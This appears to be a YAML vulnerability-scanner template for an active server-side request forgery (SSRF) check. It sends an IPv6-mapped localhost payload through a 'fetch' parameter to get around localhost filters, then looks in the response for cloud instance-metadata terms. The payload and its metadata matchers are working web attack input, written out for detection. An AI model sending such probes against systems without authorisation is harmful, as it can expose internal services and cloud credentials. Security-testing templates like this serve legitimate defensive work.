id: patt-ssrf-ipv6-01-fetch
name: 'PATT ssrf patt-ssrf-ipv6-01 via fetch'
severity: high
type: active
tags:
  - ssrf
  - patt
  - protoipv6
description: 'PATT Bypass Localhost with IPv6 Notation. [patt:patt-ssrf-ipv6-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      fetch:
        - 'http://[::ffff:127.0.0.1]/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
